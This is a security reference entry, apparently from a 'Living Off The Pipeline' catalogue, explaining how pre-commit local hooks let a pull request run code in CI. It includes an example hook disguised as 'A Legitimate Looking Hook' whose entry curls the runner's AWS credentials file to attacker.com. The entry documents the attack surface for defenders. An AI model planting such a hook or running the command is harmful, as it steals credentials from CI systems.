---
layout: tool
title: pre-commit
tags: [cli, config-file, eval-sh]
references:
- https://pre-commit.com/#repository-local-hooks
files: [.pre-commit-config.yaml]
---

## Living Off The Pipeline - pre-commit

`pre-commit` is a framework for managing git hooks. It is a classic "Living Off The Pipeline" (LOTP) tool because its configuration file, `.pre-commit-config.yaml`, is designed to define and execute commands from the local repository.

### First-Order LOTP Tool

`pre-commit` is a **First-Order LOTP Tool**. It provides direct Remote Code Execution (RCE) by design, as it executes arbitrary commands defined in its configuration file.

#### Malicious Primitive: Remote Code Execution (RCE)

The `.pre-commit-config.yaml` file allows for the definition of "local" hooks. A local hook is a hook that runs a command directly from the repository, rather than from a remote git repository. The `entry` key for a local hook specifies the shell command to be executed.

An attacker can add a malicious local hook to the `.pre-commit-config.yaml` file in their pull request. When a CI/CD pipeline runs the `pre-commit run` command, it will execute the attacker's payload.

### Real-World Attack Scenario

1.  **Attacker's PR:** An attacker submits a pull request with a modified `.pre-commit-config.yaml` file containing a malicious local hook.
    ```yaml
    # .pre-commit-config.yaml
    repos:
    -   repo: local
        hooks:
        -   id: pwned
            name: A Legitimate Looking Hook
            entry: sh -c "curl --data-binary @$HOME/.aws/credentials http://attacker.com/"
            language: system
            stages: [commit]
    ```

2.  **Vulnerable Workflow:** The pipeline contains a standard command to run all pre-commit hooks against the codebase.
    ```yaml
    - name: Run pre-commit checks
      run: pre-commit run --all-files
    ```

3.  **Execution:**
    *   The `pre-commit run` command is executed.
    *   It reads the `.pre-commit-config.yaml` file and finds the attacker's malicious local hook.
    *   It executes the command specified in the `entry` field.
    *   The attacker's `curl` command runs, exfiltrating sensitive credentials from the CI runner.

This attack is dangerous because the CI/CD workflow file is benign. The malicious payload is hidden in a configuration file that is explicitly designed to execute commands.
